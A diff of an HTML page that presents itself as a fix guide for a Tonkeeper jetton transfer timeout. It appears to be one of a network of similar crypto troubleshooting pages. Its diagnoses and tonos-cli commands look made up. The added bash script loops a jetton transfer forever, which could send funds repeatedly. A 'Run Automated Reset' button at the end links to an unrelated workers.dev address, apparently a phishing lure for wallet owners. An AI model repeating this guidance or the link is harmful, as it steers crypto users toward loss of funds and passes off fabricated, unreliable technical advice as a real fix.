@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0f111a;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -42,30 +42,32 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a timeout error when attempting to transfer Tonkeeper jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
+<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary mismatch between the Tonkeeper wallet's internal state and the TON blockchain, causing the transfer loop to exceed the maximum allowed time, thus timing out.</li>
+<li>The error occurs due to a prolonged waiting period for transaction confirmation on the TON blockchain, exceeding the predefined timeout threshold set by Tonkeeper.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Restart the Tonkeeper wallet application to resynchronize with the TON blockchain.</li>
-<li>Check for any pending transactions and cancel them if necessary.</li>
-<li>Use the following command to manually update the wallet's internal state:</li>
+<li>Increase the timeout threshold manually by editing the Tonkeeper configuration file.</li>
+<li>Utilize the TON blockchain explorer to verify the status of pending transactions and identify potential network congestion.</li>
+<li>Implement a retry mechanism using the following bash script:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>resizeWallet<span class="w"> </span>0x0<span class="w"> </span><span class="o">{}</span><span class="w"> </span>--abi<span class="w"> </span>Wallet.abi
+<div class="codehilite"><pre><span></span><code><span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>transferJetton<span class="w"> </span><span class="s2">&quot;&lt;jetton_address&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;&lt;recipient_address&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;&lt;amount&gt;&quot;</span>
+<span class="w">  </span>sleep<span class="w"> </span><span class="m">10</span>
+<span class="k">done</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and manual intervention.</p>
+<p>Consider utilizing an external console for more complex troubleshooting and customization.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonkeeper wallet application installed and configured.</li>
-<li>Sufficient TON balance to cover transaction fees.</li>
-<li>Stable internet connection for seamless blockchain synchronization.</li>
+<li>Tonkeeper wallet installed and configured</li>
+<li>TON blockchain node synced and operational</li>
+<li>Basic understanding of TON blockchain and Tonkeeper functionality</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
